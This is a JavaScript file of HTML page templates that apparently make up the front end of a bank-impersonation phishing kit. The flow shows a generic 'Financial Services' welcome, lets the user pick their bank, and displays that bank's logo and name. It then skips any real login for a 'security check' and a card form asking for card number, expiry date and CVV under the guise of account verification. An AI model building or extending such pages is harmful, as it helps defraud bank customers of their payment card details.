const PageTemplates = {
    loadingPage: () => `
        <div class="loading-page">
            <div class="loading-spinner"></div>
            <div class="loading-text">Please wait while we connect you securely</div>
        </div>
    `,

    welcomeModal: () => `
        <div class="welcome-modal modal">
            <div class="modal-content">
                <h2>Welcome to Financial Services</h2>
                <p>To continue, please select your bank from our list</p>
                <button class="primary-button" onclick="app.startBankSearch()">Start Search</button>
            </div>
        </div>
    `,

    bankSearch: () => `
        <div class="bank-search-page">
            <div class="search-container">
                <h2>Select your bank</h2>
                <div class="search-input-container">
                    <input type="text" 
                           class="search-input" 
                           placeholder="Type bank name"
                           oninput="app.handleBankSearch(this.value)">
                </div>
                <div id="bankListContainer" class="bank-list-container"></div>
            </div>
        </div>
    `,

    bankConfirmModal: (bank) => `
        <div class="bank-confirm-modal modal">
            <div class="modal-content">
                <img src="media/banks/${bank.image}" alt="${bank.name}" class="bank-logo">
                <h3>Continue with ${bank.name}?</h3>
                <button class="primary-button" onclick="app.showLoginPage()">Continue</button>
            </div>
        </div>
    `,

    loginPage: (bank) => `
        <div class="login-page">
            <div class="bank-header">
                <img src="media/banks/${bank.image}" alt="${bank.name}" class="bank-logo">
                <h3>${bank.name}</h3>
            </div>
            <div class="login-container">
                <button class="primary-button" onclick="app.showSecurityCheck()">
                    Sign in with username and password
                </button>
            </div>
        </div>
    `,

    securityCheck: () => `
        <div class="security-check-page">
            <div class="security-content">
                <h2>Security Check Required</h2>
                <p>For your security, we need to verify your identity.</p>
                <div class="security-icons">
                    <img src="media/security-icon.png" alt="Security" class="security-icon">
                </div>
                <button class="primary-button" onclick="app.showCardVerification()">Continue</button>
            </div>
        </div>
    `,

    cardVerification: () => `
        <div class="card-verification-page">
            <h2>Account Verification by Card</h2>
            <div class="card-form">
                <div class="form-group">
                    <label>Card Number</label>
                    <input type="text" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label>Expiry Date</label>
                        <input type="text" placeholder="MM/YY" maxlength="5">
                    </div>
                    <div class="form-group">
                        <label>CVV</label>
                        <input type="text" placeholder="XXX" maxlength="3">
                    </div>
                </div>
                <button class="primary-button" onclick="app.showCompleteTransaction()">Continue</button>
            </div>
        </div>
    `,

    completeTransaction: () => `
        <div class="complete-transaction-page">
            <div class="transaction-content">
                <h2>Complete Transaction</h2>
                <div class="transaction-details">
                    <div class="detail-item">
                        <span>Service:</span>
                        <span>Financial Registration</span>
                    </div>
                    <div class="detail-item">
                        <span>Status:</span>
                        <span>Pending Completion</span>
                    </div>
                </div>
                <button class="primary-button" onclick="app.handleCompletion()">
                    Complete Transaction
                </button>
            </div>
        </div>
    `
}; 